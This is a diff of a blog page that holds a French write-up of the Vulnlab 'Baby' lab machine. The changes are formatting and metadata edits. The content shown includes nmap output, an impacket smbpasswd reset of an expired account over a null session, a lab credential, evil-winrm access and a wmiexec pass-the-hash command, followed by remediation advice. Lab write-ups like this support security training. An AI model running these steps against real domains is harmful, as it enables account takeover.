@@ -97,7 +97,7 @@
   <h1 class="post-title">
     <a href="/posts/1/">📦 Machine Baby - Vulnlab</a>
   </h1>
-  <div class="post-meta"><time class="post-date">2024-04-06</time><span class="post-author">Hadrien</span><span class="post-reading-time">7 min read (1301 words)</span></div>
+  <div class="post-meta"><time class="post-date">2024-04-06</time><span class="post-author">Hadrien C</span><span class="post-reading-time">7 min read (1301 words)</span></div>
 
   
     <span class="post-tags">
@@ -112,10 +112,26 @@
 
 
   
+    <div class="table-of-contents">
+      <h2>
+        Sommaire
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#-énumération">🔍 Énumération</a></li>
+    <li><a href="#-exploitation">🤯 Exploitation</a></li>
+    <li><a href="#-élévation-de-privilège">🔼 Élévation de privilège</a></li>
+    <li><a href="#-proposition-de-remédiation">🩹 Proposition de remédiation</a></li>
+    <li><a href="#-documentations">📚 Documentations</a></li>
+    <li><a href="#-outils">🧰 Outils</a></li>
+  </ul>
+</nav>
+    </div>
+  
 
   <div class="post-content"><div>
         <p>A travers cet article, nous allons voir comment passer administrateur d&rsquo;une machine proposée par <a href="https://www.vulnlab.com">Vulnlab</a> &ldquo;Baby&rdquo;.</p>
-<h1 id="-énumération">🔍 Énumération<a href="#-énumération" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="-énumération">🔍 Énumération<a href="#-énumération" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>La découverte de port s&rsquo;effectue avec nmap : <code>nmap IP -sCV -T4</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">PORT</span>     <span style="color:#a6e22e">STATE</span> <span style="color:#a6e22e">SERVICE</span>       <span style="color:#a6e22e">VERSION</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">53</span><span style="color:#f92672">/</span><span style="color:#a6e22e">tcp</span>   <span style="color:#a6e22e">open</span>  <span style="color:#a6e22e">domain</span>        <span style="color:#a6e22e">Simple</span> <span style="color:#a6e22e">DNS</span> <span style="color:#a6e22e">Plus</span>
@@ -211,7 +227,7 @@
 <p>Le compte est marqué pour indiquer que le mot de passe doit être modifié lors de la prochaine ouverture de session. <a href="https://learn.microsoft.com/fr-fr/windows/win32/api/subauth/nf-subauth-msv1_0subauthenticationroutineex">Documentations Microsoft</a></p>
 </blockquote>
 <p>Et bien, Modifons le ! 😼</p>
-<h1 id="-exploitation">🤯 Exploitation<a href="#-exploitation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="-exploitation">🤯 Exploitation<a href="#-exploitation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>L&rsquo;outil de la suite impacket <code>smbpasswd</code>, permet de changer les mots de passe d&rsquo;objet AD via MSRPC-SAMR</p>
 <blockquote>
 <p>L&rsquo;interface SAMR, utilisée pour accéder aux éléments publics de la base de données SAM (par ex., noms d&rsquo;utilisateur) et forcer les mots de passe des utilisateurs indépendamment de la politique de verrouillage des comptes. <a href="https://book.hacktricks.xyz/v/fr/network-services-pentesting/135-pentesting-msrpc">Article de Hacktricks : 135 Pentesting MS-RPC</a></p>
@@ -222,7 +238,7 @@
 </span></span><span style="display:flex;"><span>[<span style="color:#f92672">!</span>] <span style="color:#a6e22e">Password</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">expired</span>, <span style="color:#a6e22e">trying</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">bind</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">a</span> <span style="color:#66d9ef">null</span> <span style="color:#a6e22e">session</span>.
 </span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#a6e22e">Password</span> <span style="color:#a6e22e">was</span> <span style="color:#a6e22e">changed</span> <span style="color:#a6e22e">successfully</span>.
 </span></span></code></pre></div><p>Nous avons donc un compte valide sur le domaine : <code>Caroline.Robinson:123Pentest!!!</code></p>
-<h1 id="-élévation-de-privilège">🔼 Élévation de privilège<a href="#-élévation-de-privilège" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="-élévation-de-privilège">🔼 Élévation de privilège<a href="#-élévation-de-privilège" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Ici, Caroline.Robinson possède les droits de connexion à distance via WinRM, puisqu&rsquo;elle fait partie du groupe <code>BUILTIN\Remote Management Users</code>, il est possible de récupérer l&rsquo;information en mappant l&rsquo;AD via bloodhound ou liste les groupes via ldapsearch, netexec etc&hellip;</p>
 <p><em>Au moment où j&rsquo;ai réalisé la box, j&rsquo;avais tenté à l&rsquo;aveugle la connexion via winRM mais il est préférable de lister les groupes de l&rsquo;utilisateur avant de tenter la connexion</em></p>
 <p>Connexions à distance avec evil-winrm</p>
@@ -310,7 +326,7 @@
 <p><img alt="1" src="/1/baby-1.png"></p>
 <p>Nous pouvons nous connecter en utilisant le hash NT du compte Administrateur.</p>
 <p><code>wmiexec.py -hashes :&quot;Hash NT&quot; &quot;baby.vl&quot;/&quot;Administrator&quot;@&quot;$10.10.112.19&quot;</code></p>
-<h1 id="-proposition-de-remédiation">🩹 Proposition de remédiation<a href="#-proposition-de-remédiation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="-proposition-de-remédiation">🩹 Proposition de remédiation<a href="#-proposition-de-remédiation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <ul>
 <li>
 <p>Désactiver les nulles sessions</p>
@@ -322,14 +338,14 @@
 <p>Nettoyer les descriptions des objects AD</p>
 </li>
 </ul>
-<h1 id="-documentations">📚 Documentations<a href="#-documentations" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="-documentations">📚 Documentations<a href="#-documentations" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <ul>
 <li>Article sur les nulls sessions <a href="https://www.blumira.com/glossary/null-session/">https://www.blumira.com/glossary/null-session/</a></li>
 <li>Explication du message d&rsquo;erreur <code>STATUS_LOGON_FAILURE</code>: <a href="https://learn.microsoft.com/fr-fr/windows/win32/api/subauth/nf-subauth-msv1_0subauthenticationroutineex">https://learn.microsoft.com/fr-fr/windows/win32/api/subauth/nf-subauth-msv1_0subauthenticationroutineex</a></li>
 <li>Interface MS-RPC : <a href="https://book.hacktricks.xyz/v/fr/network-services-pentesting/135-pentesting-msrpc">https://book.hacktricks.xyz/v/fr/network-services-pentesting/135-pentesting-msrpc</a></li>
 <li>POC Dump NTDS (Backup Operators, SeBackupPrivilege et SeRestorePrivilege) : <a href="https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960">https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960</a></li>
 </ul>
-<h1 id="-outils">🧰 Outils<a href="#-outils" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="-outils">🧰 Outils<a href="#-outils" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p><strong>Linux :</strong></p>
 <ul>
 <li><a href="https://nmap.org/">nmap</a></li>
@@ -354,6 +370,13 @@
         <hr />
     </div>
     <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="/posts/2/">
+                <span class="button__icon">←</span>
+                <span class="button__text">📦 Machine Delegate - Vulnlab (En cours de rédaction)</span>
+            </a>
+        </span>
         
         
         <span class="button next">
